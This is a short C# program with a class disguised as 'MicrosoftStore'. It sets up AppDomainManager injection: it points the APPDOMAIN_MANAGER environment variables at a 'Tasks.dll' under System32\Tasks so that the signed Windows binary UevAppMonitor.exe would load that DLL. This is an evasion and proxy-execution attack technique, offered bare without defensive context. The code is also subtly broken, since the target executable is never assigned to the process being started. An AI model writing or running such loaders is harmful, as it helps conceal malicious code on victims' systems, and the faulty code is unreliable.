using System;
using System.Diagnostics;
using System.IO;

class MicrosoftStore
{
    static void Main()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string uevAppPath = Environment.ExpandEnvironmentVariables("%WINDIR%\\System32\\UevAppMonitor.exe");
        if (!File.Exists(uevAppPath))
        {
            return;
        }

        string tasksPath = Environment.ExpandEnvironmentVariables("%WINDIR%\\System32\\Tasks\\Tasks.dll");

        startInfo.EnvironmentVariables["APPDOMAIN_MANAGER_ASM"] = "Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
        startInfo.EnvironmentVariables["APPDOMAIN_MANAGER_TYPE"] = "UevApp";
        Process.Start(startInfo);
        return;
    }
}